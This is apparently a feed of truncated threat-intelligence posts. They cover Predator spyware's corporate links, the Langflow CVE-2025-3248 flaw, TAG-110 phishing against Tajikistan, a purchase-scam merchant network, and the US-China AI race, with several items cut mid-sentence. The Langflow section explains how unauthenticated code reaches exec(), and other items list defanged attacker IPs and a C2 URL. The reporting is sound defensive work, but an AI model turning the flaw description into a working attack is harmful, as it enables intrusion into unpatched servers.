href="https://home.treasury.gov/news/press-releases/jy2581" target="_blank">escalation</a> of sanctions against Intellexa in September 2024.</p><h3 id="connection-to-czech-entity">Connection to Czech Entity</h3><p>During the investigation into the use of Predator against the Greek journalist Thanasis Koukakis and others, Greeces Supreme Court prosecutor <a href="https://vsquare.org/greece-czech-republic-intellexa-cytrox-spyware/" target="_blank">directed</a> the financial police to compile a report on companies connected to the Intellexa Consortium  a document later obtained by the Czech investigative outlet Investigace.cz. This report features a supplier table listing entities associated with Intellexa, including an individual named Dvir Horef Hazan. He, along with the connections described in the report, is shown in <strong>Figure 6</strong>.</p><p><img src="https://cms.recordedfuture.com/uploads/Predator3_003_77c8e4cc6b.png" alt="Predator3-003.png"><em><strong>Figure 6:</strong> Connections between Predator infrastructure and FoxITech s.r.o. (Source: Investigace.cz, Recorded Future)</em></p><p>Investigations by the Czech outlet <a href="https://vsquare.org/greece-czech-republic-intellexa-cytrox-spyware/" target="_blank">found</a> that Hazan, a Czech bistro owner, programmer, and entrepreneur with ownership of at least eight Czech companies, with four specializing in marketing, consulting, and IT advisory, allegedly worked for Intellexa. Greek police reports show that Intellexa transferred nearly 3 million to Hazan and three of his companies (Zambrano Trade s.r.o., Hadastech s.r.o., and Shilo s.r.o.) for unspecified services. Additionally, Importgenius records reveal that Hadastech, solely directed by Hazan, received 40 shipments from an unidentified Ukrainian company between 2020 and 2021, described as mobile phones and &quot;other networking apparatus.&quot;</p><p>Further analysis shows that Hazan is also indirectly linked to FoxITech s.r.o., a Czech company based in Krnov and owned by Michal Ikonomidis, which claims to provide integrated IT and business services, including software development, cybersecurity, HR recruitment, and back-office support, to clients globally. More specifically, FoxITech s.r.o. is headquartered in a building owned by one of Hazans companies, which also houses the other previously mentioned Hazan-owned businesses. This link between Hazan and FoxITech s.r.o. is further evidenced by Hazan and Ikonomidis appearing to be friends, based on social media, and the fact that Hazans first company and FoxITech s.r.o. were both registered at the notarys office by the same proxy. Moreover, RIPE (Rseaux IP Europens) entries linked to FoxITech s.r.o. include email addresses associated with Hazans company, Shilo s.r.o. According to Investigace.cz, an email sent to FoxITech s.r.o. was answered from an address belonging to one of Hazans companies, Bender ONE s.r.o. </p><p>Although the precise nature and purpose of the connection between FoxITech s.r.o. and Predator operations remain unclear, Insikt Group has observed that Tier 4 servers regularly communicate with Tier 5 infrastructure, which is linked to FoxITech s.r.o. This establishes a link between Predators multi-tiered infrastructure and the Czech entity, marking the first technical connection made between Predator infrastructure and corporate entities associated with the Intellexa Consortium.</p><p>Notably, Investigace.cz previously <a href="https://vsquare.org/greece-czech-republic-intellexa-cytrox-spyware/" target="_blank">reported</a> on Cytrox in the Czech Republic, revealing that the companys listed director was a pensioner from a village near Ostrava, unaware of Intellexa. She knew Hazan, a family acquaintance living nearby. Also, her daughters husband, Amos Uzan, is an Israeli who worked in government security and communications roles from 20032009, during Ehud Olmerts tenure as Prime Minister. Olmert had previously disclosed that he was a paid advisor to Intellexa between 2006 to 2009.</p><h2 id="outlook">Outlook</h2><p>Insikt Group has uncovered evidence indicating the continued use of Predator, including in Mozambique, despite widespread media attention and sanctions targeting Intellexa and related entities. Although recent activity has been observed, the reduced number of suspected operators compared to earlier reports suggests that public exposure, sanctions, and related measures have likely imposed operational costs on Intellexa. Moreover, while Predator operators historically maintained a consistent modus operandi, the latest findings reveal the adoption of new tactics to evade detection. Sanctions and other pressures are likely to drive efforts to increase the complexity of corporate structures, making operations harder to trace and disrupt. The continued spread of Predator and similar spyware products, as well as the availability of hack-for-hire services beyond legitimate law enforcement and counterterrorism uses, presents a significant risk to a broad range of organizations and individuals.</p><p>To read the entire analysis, <a href="https://go.recordedfuture.com/hubfs/reports/cta-2025-0612.pdf" target="_blank">click here</a> to

            <content:encoded><![CDATA[<h2 id="langflow-cve-2025-3248">Langflow: CVE-2025-3248</h2><h3 id="what-is-cve-2025-3248">What is CVE-2025-3248?</h3><p><a href="https://www.recordedfuture.com/vulnerability-database/CVE-2025-3248">CVE-2025-3248</a> is a critical missing authentication vulnerability affecting Langflow versions before 1.3.0. Langflow is a widely used tool for building and deploying AI-powered agents and workflows. On May 5, 2025, the US Cybersecurity and Infrastructure Security Agency (<a href="https://www.cisa.gov/">CISA</a>) also added CVE-2025-3248 to its <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">Known Exploited Vulnerabilities (KEV) catalog</a>. Exploiting the vulnerability can allow remote, unauthenticated attackers to send crafted HTTP requests and execute arbitrary code by abusing Python decorators and default arguments. </p><p>Given the high risk associated with this vulnerability and ongoing exploitation attempts, it is imperative to prioritize patching CVE-2025-3248 on your company&#39;s assets to prevent unauthorized access and attackers potentially taking control of affected systems.</p><h4 id="insikt-groups-assessment-of-cve-2025-3248">Insikt Groups Assessment of CVE-2025-3248</h4><p>CVE-2025-3248 arises from Langflows failure to implement appropriate input sanitization and execution control at the &quot;<span style="font-family:courier;">/api/v1/validate/code</span>&quot; endpoint, where it insecurely uses Pythons &quot;<span style="font-family:courier;">compile</span>&quot; and &quot;<span style="font-family:courier;">exec()</span>&quot; function to process user-supplied code. Specifically, the vulnerability results from Langflows approach of validating function definitions by parsing them into an Abstract Syntax Tree (AST) and executing specific components.</p><p>The endpoint parses the user-submitted code field using &quot;<span style="font-family:courier;">ast.parse()</span>&quot; to construct an AST. Langflow then uses Pythons compile function to convert the parsed AST into executable bytecode. During AST processing, Python evaluates argument default values and decorators immediately upon compilation. This evaluation occurs when the AST node representing the function is processed, not strictly during the <span style="font-family:courier;">ast.parse()</span> step. If these components contain malicious payloads, they are executed as part of the compilation and execution phase.</p><p>Unauthenticated attackers can therefore craft malicious payloads embedded within argument defaults or decorators. Since Langflow does not enforce input validation or sandboxing, these payloads are compiled and executed within the server context, leading to remote code execution (RCE). In vulnerable versions, remote threat actors can submit specially crafted POST requests to the endpoint, potentially deploying reverse shell commands, data exfiltration scripts, or other malicious code without authentication or adequate restriction.</p><p>At the time of writing, there were 1,050 exposed Langflow instances on Shodan. However, not all of these are necessarily vulnerable as their specific versions are unknown. Additionally, cybersecurity firm Greynoise observed 361 malicious IP addresses attempting to exploit CVE-2025-3248, primarily targeting systems in the US, Australia, Singapore, Germany, and Mexico.</p><table>  <tr>    <th>Malicious IP Address</th>    <th>Source Location</th>    <th>Target Location</th>  </tr>  <tr>    <td>45.33.95[.]165</td>    <td>US</td>    <td>Germany, Singapore, UK, India, US, Netherlands, Canada, Australia, France, Bahrain, Brazil, Italy, Japan, Mexico, South Africa, South Korea, Thailand, Finland, Hong Kong, Indonesia, Israel, UAE, Belgium, Malaysia, Taiwan</td>  </tr>  <tr>    <td>3.35.37[.]70</td>    <td>South Korea</td>    <td>France, Germany, Italy, Mexico, Netherlands, US</td>  </tr>  <tr>    <td>139.59.223[.]9</td>    <td>Singapore</td>    <td>Lithuania</td>  </tr>  <tr>    <td>35.221.194[.]209</td>    <td>Taiwan</td>    <td>Germany</td>  </tr>  <tr>    <td>204.216.147[.]144</td>    <td>Brazil</td>    <td>Taiwan, Turkey</td>  </tr></table><p><em><strong>Table 1:</strong> Example malicious IP addresses attempting to exploit CVE-2025-3248 (Source: <a href="https://viz.greynoise.io/query/CVE-2025-3248%20tags:%22Langflow%20Code%20Injection%20CVE-2025-3248%20RCE%20Attempt%22">Greynoise</a>)</em></p><p>Multiple proof-of-concept (PoC) exploits were also shared on GitHub; public PoC exploits often increase the likelihood of continued active exploitation.

            <content:encoded><![CDATA[<p><img src="https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png" alt="insikt group logo"></p><p><em>Note: The analysis cut-off date for this report was March 24, 2025.</em></p><h2 id="executive-summary">Executive Summary</h2><p>From January to February 2025, Insikt Group detected a phishing campaign targeting Tajikistan that Insikt Group attributes to TAG-110, a Russia-aligned threat actor that overlaps with UAC-0063 and has been linked to APT28 (BlueDelta) with medium confidence by CERT-UA. In this campaign, TAG-110 leveraged Tajikistan government-themed documents as lure material, consistent with its historical use of trojanized legitimate government documents, though the authenticity of the current samples could not be independently verified. These documents were distinct from those used in previous campaigns (<a href="https://www.recordedfuture.com/research/russia-aligned-tag-110-targets-asia-and-europe">1</a>, <a href="https://www.bitdefender.com/en-us/blog/businessinsights/uac-0063-cyber-espionage-operation-expanding-from-central-asia">2</a>, <a href="https://cert.gov.ua/article/6280129">3</a>, <a href="https://blog.sekoia.io/double-tap-campaign-russia-nexus-apt-possibly-related-to-apt28-conducts-cyber-espionage-on-central-asia-and-kazakhstan-diplomatic-relations/">4</a>), notably lacking an embedded <a href="https://learn.microsoft.com/en-us/previous-versions/ms536495(v=vs.85)">HTA</a>-based payload HATVIBE within them, which TAG-110 has deployed since at least 2023. In this campaign, TAG-110 has shifted to using macro-enabled Word template files (.dotm files) rather than HATVIBE for the initial payload. Given TAG-110s historical targeting of public sector entities in Central Asia, this campaign is likely targeting government, educational, and research institutions within Tajikistan.</p><p>Russias Central Asian policy centers on preserving a postSoviet sphere of influence by embedding itself at the core of the regions security, economic, and political architecture. TAG-110&#39;s activities continue to bolster this policy through intelligence-gathering operations. Insikt Group anticipates TAG110 will sustain regional operations against government ministries, academic and research bodies, and diplomatic missions, particularly those involved in upcoming elections, military operations, or other events the Kremlin wishes to influence.</p><h2 id="key-findings">Key Findings</h2><ul><li>TAG-110 has changed its spearphishing tactics in recent campaigns against Tajikistan, as they now rely on macro-enabled Word templates (.dotm files).</li><li>This campaign has been attributed to TAG-110 based on its reuse of VBA code found in lures from previous campaigns, overlap in C2 infrastructure, and use of suspected legitimate government documents for lure material.</li><li>TAG-110s persistent targeting of Tajik government, educational, and research institutions supports Russias strategy to maintain influence in Central Asia.

TAG-110 has conducted cyber-espionage campaigns primarily targeting Central Asia since <a href="https://cert.gov.ua/article/4697016?fbclid=IwAR1B5gj0v-Ve9Q5299ydM5lrInLuKVmvPRosQkUucq6YzcjuTgVnM_x3LjQ">at least 2021</a>. Historically, this group has been known for its use of macro-enabled Word documents to deliver malicious payloads such as HATVIBE, an HTA-based malware designed for initial access and persistence. In November 2024, Insikt Group <a href="https://www.recordedfuture.com/research/russia-aligned-tag-110-targets-asia-and-europe">highlighted</a> TAG-110s use of HTA-embedded spearphishing attachments in emails tailored for Central Asian diplomatic entities. TAG-110s operations have been documented by organizations such as <a href="https://cert.gov.ua/article/4697016?fbclid=IwAR1B5gj0v-Ve9Q5299ydM5lrInLuKVmvPRosQkUucq6YzcjuTgVnM_x3LjQ">CERT-UA</a>, <a href="https://www.bitdefender.com/en-us/blog/businessinsights/uac-0063-cyber-espionage-operation-expanding-from-central-asia">BitDefender</a>, and <a href="https://blog.sekoia.io/double-tap-campaign-russia-nexus-apt-possibly-related-to-apt28-conducts-cyber-espionage-on-central-asia-and-kazakhstan-diplomatic-relations/">Sekoia</a>, with recent campaigns targeting entities in Kazakhstan, Uzbekistan, and other Central Asian states. TAG-110 continues to use a variety of custom malware families to conduct espionage activities, including CHERRYSPY (DownExPyer), LOGPIE, and PyPlunderPlug.</p><h2 id="threat-analysis">Threat Analysis</h2><p>Beginning in January 2025, Insikt Group detected new TAG-110 first-stage payloads, which suggested the threat actors were evolving their tactics. Previously, TAG-110 leveraged macro-enabled Word documents to deliver HATVIBE, an HTA-based malware, for initial access. The newly detected documents do not contain the embedded HTA HATVIBE payload for creating a scheduled task and instead leverage a global template file placed in the Word startup folder for persistence.</p><h3 id="document-analysis">Document Analysis</h3><table>  <tr>    <td>SHA256 Hash</td>    <td>d60e54854f2b28c2ce197f8a3b37440dfa8dea18ce7939a356f5503ece9e5eb7</td>  </tr>  <tr>    <td>Document Name(s)</td>    <td>documents.php</td>  </tr>  <tr>    <td>Document Creation Time</td>    <td>2024-12-24 06:47:00 UTC</td>  </tr>  <tr>    <td>First Seen</td>    <td>2025-01-27 09:18:33 UTC</td>  </tr>  <tr>    <td>First Seen Triage</td>    <td>2024-01-31 18:16:00 UTC</td>  </tr>  <tr>    <td>C2 Host</td>    <td>http://38.180.206[.]61:80/engine.php</td>  </tr>  <tr>    <td>File Type</td>    <td>MS Word 2007+ Macro-Enabled Template (.dotm)</td>  </tr></table><p><strong>Table 1:</strong> Metadata of <span style="font-family:courier;">d60e54854f2b28c2ce197f8a3b37440dfa8dea18ce7939a356f5503ece9e5eb7</span> (Source: Recorded Future)</p><p>The first document (<strong>Figure 1</strong>) appears to be a notice to the armed forces of Tajikistan themed on ensuring radiation safety.

            <content:encoded><![CDATA[<p>RSA is always a good opportunity to reconnect with industry friends2025 was no exception. Beneath the marketing avalanche of AI-enabled everything, one theme stuck out in conversations with CISOs and defensive leaders: the mounting time and energy spent on cyber audits, reporting, and remediation.</p><p>These Enterprise Risk Management (ERM) and Governance, Risk, and Compliance (GRC) efforts are especially demanding in regulated industries. But with mandates like <a href="https://digital-strategy.ec.europa.eu/en/policies/nis2-directive">NIS2</a> and <a href="https://finance.ec.europa.eu/regulation-and-supervision/financial-services-legislation/implementing-and-delegated-acts/digital-operational-resilience-regulation_en">DORA</a> taking effect in Europeand domestic frameworks like <a href="https://www.isaca.org/resources/isaca-journal/issues/2022/volume-6/are-it-general-controls-outdated">SOX</a>, <a href="https://www.aicpa-cima.com/resources/download/trust-services-criteria">SOC2</a>, and <a href="https://dodcio.defense.gov/CMMC/Documentation/">CMMC</a> still in playsecurity leaders are spending more time with audit committees than ever before.</p><h2 id="compliance-theater-starring-the-risk-register">Compliance Theater: Starring the Risk Register</h2><p>In enterprises, defensive resource allocations are often adjudicated by committees and measured by audit progress and the almighty risk register. This means most of the attention (and budget) aligns with avoiding one specific risk: legal or compliance failure (LCF). Its no surprise that CISOs are often left with a single 15-minute slot each year to brief the board on the <a href="https://intelligence2risk.substack.com/p/five-risk-categories">other four cyber risk impacts</a>. Thats a missed opportunity.</p><p><img src="https://cms.recordedfuture.com/uploads/fd1196e7_bada_42fe_a6c7_89d17c95a98f_1536x1024_15d11d9d5b.webp" alt="fd1196e7-bada-42fe-a6c7-89d17c95a98f_1536x1024.webp"><em>Board presentation produced by ChatGPT 4o.</em></p><p>Boards need to better understand cyber risk beyond compliance. The <a href="https://intelligence2risk.substack.com/p/the-resilience-dilemma">state of rizz (resilience)</a> depends on more than audit checklists. Point-in-time audits work well for demonstrating regulatory due diligence. If something goes wrong, but the virtual paperwork shows that policies were followed and corrections made, enforcement actions can often be minimized or avoided.</p><p>Thats not true for the other risk impactsoperational disruption, financial fraud, brand impairment, and competitive disadvantage. Even after clean audits, the residual risk across these domains remains. Boards need to grasp this difference. And CISOs must continue translating technical risk into business language that supports resilience conversations.</p><h2 id="measuring-rizz-easier-said-than-sustained">Measuring Rizz: Easier Said Than Sustained</h2><p>Communicating rizz is momentary. Measuring it is constant. Organizations spend heavily to prevent all five impacts, but security investments tied to non-compliance impacts often receive less scrutiny (<a href="https://www.isaca.org/resources/isaca-journal/issues/2015/volume-1/return-on-security-investment15-things-to-consider">ROSI</a>). Thats where control validation comes in.</p><p><img src="https://cms.recordedfuture.com/uploads/db8bfa53_0eaa_4b4d_9851_ffc68b449c44_1600x1110_a225576cf1.webp" alt="db8bfa53-0eaa-4b4d-9851-ffc68b449c44_1600x1110.webp"><em>Sankey diagram depicting threat categories leading to multiple possible risk impacts.

As of May 8, 2025, our analysis has linked <em>lidlorg[.]com</em> to a network of 71 likely purchase <a href="https://www.recordedfuture.com/research/black-friday-trends-insights-mitigating-online-shopping-scams">scam websites</a>, including others that combine brand impersonation and online ad campaigns for propagation. All identified scam websites use one or more of twelve shared merchant accounts to process visitor transactions.

To reduce these risks, card issuers should take action against identified merchant accounts and card accounts that have transacted with those merchants, while merchant acquirers should take action against the merchant accounts. We describe these mitigation strategies in detail in the Mitigations section of this report.</p><h2 id="key-findings">Key Findings</h2><ul><li>On April 19, 2025, we identified lidlorg[.]com as a likely purchase scam website that uses brand impersonation against a German retailer.</li><li>The scam website lidlorg[.]com is likely part of a network of 71 purchase scam domains using the same merchant accounts to defraud victims and steal victim data.</li><li>Transactions with the merchant accounts linked to lidlorg[.]com are highly likely to be fraudulent and facilitate card compromise.

The scam website likely defrauds victims through the use of three linked merchant accounts, which enable the operator to conduct a fraudulent scam transaction while stealing victim personal and financial data for downstream fraud.</p><br><hr><p><strong>Recorded Future <a href="https://www.recordedfuture.com/products/payment-fraud-intelligence">Payment Fraud Intelligence</a> distinguishes purchase scam websites from phishing websites through their use of linked merchant accounts.</strong> While the purchase scams we identify are similar to other online scams (especially in their reliance on fraudulent offers for goods and services that buyers will never receive), they are distinct from phishing websites because they can process victim payments rather than simply collecting victim data through bogus form submissions.</p><hr><br><p><img src="https://cms.recordedfuture.com/uploads/brand_imperson_002_c8c4938189.png" alt="brand-imperson-002.png"><em><strong>Figure 1:</strong> Online ad accounts for the likely scam website lidlorg[.]com impersonate a German brand (Source: Facebook Ads)</em></p><p><strong>Our analysis indicated that <em>lidlorg[.]com</em> is part of a network of 71 likely scam e-commerce domains, as indicated by overlapping use of scam merchant accounts.</strong> All likely scam domains use various combinations of the same merchant accounts for their payment functionality and have been operational since no later than February 2025. Many of the domains also use typosquatting to impersonate multiple brands. At the time of our analysis, many of the domains were associated with active or historical online ad campaigns. Many of these were also removed by the ad platform for <a href="https://transparency.meta.com/policies/ad-standards/fraud-scams/unacceptable-business-practices">Unacceptable Business Practices</a>, which includes scam activity.

For example, merchant data indicates that PETHOUSEN LLC is associated with pethousen[.]com rather than the three scam domains we linked it to (biliability[.]com, dknyonlineuk[.]com, outletmalleu[.]shop). Inaccurately associated merchant URLs often indicate that a merchant is engaging in transaction laundering.</p><br><hr><p><strong>Transaction laundering allows threat actors to conceal high-risk or illegal activity by processing payments for an entity, goods, or services unknown to the merchants acquiring bank or payment provider.</strong> While the transactions are disguised as low-risk or legitimate purchases, they are often transactions for illegal activities. In this sense, all purchase scam transactions that defraud victims are inherently a form of transaction laundering.</p><hr><br><p><strong>It is unclear whether the scam network identified in this report is controlled by a single threat actor or various threat actors acting in concert.</strong> Merchant account abuse for purchase scams frequently overlaps between networks of linked domains, as shown in Figure 2. While merchant accounts dispersed throughout scam networks network can have similarities that suggest a common origin or operator, the networks of scam domains linked to the merchant accounts are often distinct (for example, in their abuse of different ad platforms for propagation to victims)</p><p>Because of this, we consider the two following scenarios equally likely regarding attribution of the scam network to an operator:</p><ul><li>Multiple networks of scam domains operated by different threat actors may be using the same merchant accounts, whose services are rented out as part of a third-party, dark web-based cash-out offering.</li><li>A single threat actor may be controlling the domain and merchant infrastructure for the entire network, intentionally rotating the domain/merchant combinations in an attempt to obscure attribution.</li></ul><br><hr><p><strong>An ecosystem of illicit dark web services likely supports <a href="https://www.recordedfuture.com/research/how-cybercrime-gets-monetized">fraud-focused threat actors</a>.</strong> These threat actors leverage third-party services for a variety of scam use cases, including the following:</p><ul><li><strong>Fraud-based malvertising services:</strong> Threat actors organize illicit advertising services by compromising advertiser accounts for online ad platforms or by purchasing advertising campaigns using stolen financial data.</li><li><strong>Cash-out services:</strong> Threat actors purvey merchant accounts under their control to other threat actors to monetize stolen card data.</li><li><strong>Traffic services:</strong> Threat actors drive traffic to artificially boost malicious advertisements, including for scam websites, in search results. Alternatively, they partner with cash-out service providers to monetize existing victim traffic to scam domains.</li></ul><hr><br><p><strong>Card issuers and merchant acquirers with access to merchant data can likely leverage merchant analysis for threat actor attribution of this scam network.</strong> Commonalities in merchant registration would likely indicate that the accounts are operated by a single threat actor, whereas discrepancies would indicate that the accounts are operated by various threat actors. Identical company data is an example of a commonality that we would expect to see in linked merchant accounts operated by a single threat actor.</p><p>Note that since scam domains are easier to acquire and less resilient to detection and mitigation than merchant accounts (and therefore more expendable as infrastructure), we consider domain analysis less likely to enable threat actor attribution of this scam network.</p><h2 id="mitigations-for-fraud-prevention">Mitigations for Fraud Prevention</h2><p>Purchase scams present financial fraud risks to card issuers and compliance risks to merchant acquirers, especially in cases where linked scam merchant accounts are also abused to support transaction laundering activity. To reduce these risks, apply the mitigation strategies described below.</p><h3 id="card-issuers">Card Issuers</h3><ul><li>To prioritize fraud prevention over potential customer friction, immediately decline transactions with the identified scam merchant accounts and track customer card accounts that have transacted with the merchant for additional fraud signals before taking action.<ul><li>Escalate the fraud risk score of customer accounts that attempt transactions with the merchants or flag the account for additional review.</li><li>Consider the presence of additional fraud signals on flagged accounts as a high-confidence basis to reissue the customer card or apply other remediations.</li></ul></li><li>To minimize customer friction, assess transaction data within your cardholder portfolio with the identified scam merchant accounts before taking action against either the merchant accounts or customer card accounts.<ul><li>Bucket all customer transactions with the identified merchants.</li><li>Determine a fraud incidence threshold in accordance with your organizations risk tolerance. This threshold should be higher than the baseline fraud incidence rate observed across your portfolio.</li><li>If customer transactions within the bucket exceed the fraud incidence threshold, automatically block all customer transactions with the identified merchant accounts and consider card reissue.</li></ul></li><h3 id="merchant-acquirers">Merchant Acquirers</h3><ul><li>Analyze linked merchant domains to identify other likely fraudulent merchant accounts operated within the scam network. Card network acquirer data lookup APIs may enable merchant acquirers to search for merchant accounts based on domain.</li><li>Scan merchant acquirer BIN and MCC combinations within your merchant portfolio to identify other likely fraudulent merchant accounts registered with similar merchant data or within a short period of time. Card network APIs may enable merchant acquirers to search for merchant account registrations based on acquirer BIN and MCC. </li><li>Flag suspected fraudulent merchant accounts for enhanced due diligence, investigation, suspension, or termination in accordance with your risk tolerance.</li></ul><h2 id="outlook-for-purchase-scam-networks">Outlook for Purchase Scam Networks</h2><p>Our analysis has confirmed that the likely purchase scam network identified in this report has been operational since February 2025. Because we continue to confirm new scam domains within the group are operational, the scam operation appears to be ongoing. By extension, the scam operator will likely continue deploying new domains and online ad campaigns to support their scam activity, especially as old domains and ad campaigns are taken offline.</p><p>These new scam domains will likely use the merchant accounts identified in this report. Termination or suspension of scam merchant accounts by their acquirers is unlikely to halt all scam activity by the operator. However, this kind of remediation would almost certainly place additional time and resource demands on the scam network operator to acquire new merchant account infrastructure.</p><h2

            <description><![CDATA[Explore Insikt Group's in-depth 2025 report on the US-China AI raceâcomparing funding, talent, regulation, compute capacity, and model benchmarks. Discover why China trails the US and what could change before 2030.]]></description>
            <content:encoded><![CDATA[<h2 id="executive-summary">Executive Summary</h2><p>China has stated its ambition to become the world leader in artificial intelligence (AI) by 2030, a goal that encompasses not only the performance of individual AI models that often attract significant media attention but also AI innovation broadly and widespread adoption of AI for economic and geopolitical benefit. Based on an analysis of key industry pillars informing the US-China competition for AI supremacy  including government and venture capital (VC) funding, industry regulation, talent, technology diffusion, model performance, and compute capacity  Insikt Group assesses that China is unlikely to sustainably surpass the United States (US) on its desired timeline. Currently, China either trails behind or does not clearly lead the US in any of these pillars. The US-China AI competition is likely to become tighter, with China&#39;s AI industry likely being a close second to the US globally and its AI models possibly outperforming the US at times or in some sectors. Chinese generative AI models likely lag behind US competitors by approximately three to six months as of this writing, based on Insikt Group analysis of publicly available Elo benchmarks, but potential new algorithmic breakthroughs along with agentic and collaborative AI systems could significantly sway the competitiveness of US or Chinese models before 2030.</p><p>Chinas government has sought to accelerate the development of a world-leading, globally influential AI industry since 2017, when authorities adopted a dedicated plan for achieving this goal. DeepSeeks unveiling of R1 in January 2025 was a key milestone in this endeavor. R1s capabilities reflect  and support continuing  noteworthy advances and lines of effort within Chinas AI ecosystem. Chinas AI research community is very likely benefiting from the governments supportive policy environment, government-led investment initiatives, access to an increasingly high-quality talent pool, and increasing links between academia and industry. Chinese AI companies like DeepSeek have realized performance gains by innovating and embracing open source. These companies have also become proficient at adopting techniques implemented by US peers and domestic rivals and prioritizing cost efficiency to remain competitive in domestic markets. Chinese open-source models are being adopted domestically and abroad, while inventors and organizations in China are filing more patents for generative AI applications in many key industries such as software, finance, and energy.</p><p>Despite this progress, Chinas AI industry faces important challenges. Total private sector investment in AI lags far behind the US, and central government funding likely trails US federal investment by a small margin. Chinas access to domestic AI-relevant talent is improving and the attractiveness of its domestic industry is increasing, but it is still insufficient, and the US likely retains its historical advantages. Chinas regulations, although pioneering, likely create a drag on innovation for teams with any interest in making their products public. Moreover, Chinas semiconductor industry  while achieving notable advances in spite of international export controls on specialized technology  is still unlikely to meet the rapidly growing demand for AI accelerator chips. </p><p>Maintaining leadership in the race to artificial general intelligence (AGI) is almost certainly perceived in China and the US as critical to their national security. To this end, China is almost certain to continue applying its kit of licit and illicit tools for advancing national development, to include economic espionage and foreign talent recruitment. The US and allied governments should closely monitor major developments by Chinese generative AI companies and public and private investment in research and development (R&amp;D), in addition to monitoring indicators of AI diffusion, such as applications and patents. Western AI companies should consider proactively protecting themselves from model distillation and intellectual property (IP) theft. Western hardware manufacturers subject to export controls should continue improving end-customer due diligence processes to remain compliant and avoid selling to proxies of entities sanctioned by the US. Western government, academic, and corporate entities should adopt policies that facilitate the recruitment and retention of global AI talent. </p><h2 id="key-findings">Key Findings</h2><ul><li>Chinas rapidly maturing AI ecosystem is very likely increasingly fostering collaboration between government, industry, and academia, and is supported by steady advances in semiconductor manufacturing.</li><li>Government funding for AI-related technologies is likely on an upward trajectory in both the US and China as of early 2025, and Chinas overall government-led funding likely exceeds investment by US federal and state governments; however, total private-sector investment in AI companies in the US vastly outmatches private-sector investment in China.</li><li>Chinas regulatory scheme likely hampers Chinese AI capabilities and extends development and deployment timelines  but only among developers aiming for public-facing products, meaning frontier advancements are unlikely to be impeded.</li><li>The international AI talent pool likely continues to favor the US due to a continuing  though declining  immigration advantage and the quality of elite educational institutions, but the practical implications of this lead for AI competition are likely eroding.</li><li>AI diffusion rather than innovation will very likely determine the &quot;winner&quot; in the competition to economically and geopolitically benefit from the technology, but whether the US or China has greater levels of diffusion is unclear, with one metric (patents) nevertheless showing China has a lead in many industries.</li><li>According to Insikt Group&#39;s analysis of model benchmarks, Elo scores, and industry expert assessments, Chinese generative AI models likely now have a three to six-month performance gap behind US rivals, though this time lag is shortening.</li><li>Closing the performance gap while being cost-competitive is very likely to pay off for China by driving the adoption of Chinese generative AI models domestically and abroad. </li><li>Access to high-quality training data and IP is an increasingly contested domain where the US likely retains a competitive advantage; companies in both countries are likely leveraging user-generated content (UGC) to train generative AI models.</li><li>Adopting open source is more prevalent among Chinese AI companies and likely enables China to diffuse its models more broadly than US proprietary models.</li><li>US export controls have also almost certainly prompted the Chinese government to accelerate funding for its AI hardware and semiconductor industries and high-performance computing infrastructure for training and hosting AI models. </li><li>Chinas semiconductor industry likely still faces a bottleneck in producing sub-7 nanometer (nm) chips, and it is almost certainly attempting to develop its own extreme ultraviolet (EUV) lithography tools using alternative techniques to advance domestic AI accelerator production.</li><li>Although the current US presidential administration has signalled that maintaining the USs leading position in AI development is a priority, early actions to decrease public funding for science and target international students over alleged visa infractions likely risk undermining this goal.</li></ul><h2 id="background">Background</h2><p>The race to AGI, which is <a href="https://research.aimultiple.com/artificial-general-intelligence-singularity-timing/" target="_blank">estimated</a> by AI experts and industry leaders to be concluded within the next five to ten years, holds considerable stakes for <a href="https://yoshuabengio.org/2024/10/30/implications-of-artificial-general-intelligence-on-national-and-international-security/" target="_blank">national security</a> and <a href="https://globalprioritiesinstitute.org/wp-content/uploads/Philip-Trammell-and-Anton-Korinek_economic-growth-under-transformative-ai.pdf" target="_blank">economic growth</a>.

The notion of &quot;<a href="https://www.belfercenter.org/publication/china-beating-us-ai-supremacy" target="_blank">AI supremacy</a>&quot; captures the geopolitical stakes of the AGI race, with the US and China considered by many to be <a href="https://www.csis.org/analysis/securing-agi-laurel-export-controls-compute-gap-and-chinas-counterstrategy" target="_blank">forerunners</a>. </p><p>On January 20, 2025, Chinese AI research company DeepSeek <a href="https://api-docs.deepseek.com/news/news250120" target="_blank">released</a> R1, an open-source reasoning large language model (LLM) competing with OpenAIs then state-of-the-art o1 model. The following week, US AI hardware company Nvidia subsequently <a href="https://www.reuters.com/technology/chinas-deepseek-sets-off-ai-market-rout-2025-01-27/" target="_blank">lost</a> $593 billion in market value, marking the single largest market capitalization loss in US history. Media headlines <a href="https://www.npr.org/2025/01/28/g-s1-45061/deepseek-did-a-little-known-chinese-startup-cause-a-sputnik-moment-for-ai" target="_blank">compared</a> DeepSeeks release of R1 to the Space Races &quot;Sputnik moment,&quot; <a href="https://www.rusi.org/explore-our-research/publications/commentary/what-would-sputnik-moment-us-china-ai-competition-look" target="_blank">referring</a> to a rapid and unexpected shift in perceived adversary capabilities following the Soviet Unions surprise launch of the Sputnik satellite into orbit on October 4, 1957.</p><p>The US-Soviet &quot;missile gap&quot; theory is a likely more accurate Cold War analogy of current threat perceptions. Like missile production, the AGI race is not measured solely by <a href="https://www.tandfonline.com/doi/abs/10.1080/08956308.2024.2324407" target="_blank">innovation capacity</a> (launching Sputnik) but also <a href="https://www.fpri.org/article/2024/09/explaining-chinas-diffusion-deficit/" target="_blank">diffusion capacity</a>, or the ability of national ecosystems to align capital, talent, and policies to rapidly convert innovations to economically productive processes (winning the Cold War). The missile gap analogy is also accurate insofar as US leaders <a href="https://www.armscontrol.org/act/2011-05/missile-gap-myth-and-its-progeny" target="_blank">long possessed</a> inaccurate data on Soviet missile capabilities; it was only by 1961 that innovations in satellite imagery <a href="https://www.thespacereview.com/article/523/1" target="_blank">allowed</a> decision-makers to obtain reliable data on this so-called &quot;missile gap.&quot; Following the launch of the CORONA satellite project to monitor Soviet ICBM capabilities and Chinese nuclear testing, US President Lyndon Johnson <a href="https://web.archive.org/web/20220505011605/https://www.nytimes.com/1995/09/12/science/spy-satellites-early-role-as-floodlight-coming-clear.html" target="_blank">admitted</a> in 1967: &quot;We&#39;ve spent $35 billion or $40 billion on the space program. [...] We were doing things we didn&#39;t need to do. We were building things we didn&#39;t need to build. We were harboring fears we didn&#39;t need to harbor.&quot; Similarly, advances (whether real or speculative) in Chinese AI development are very likely fueling funding for AI research in the US, where AI capital expenditure is <a 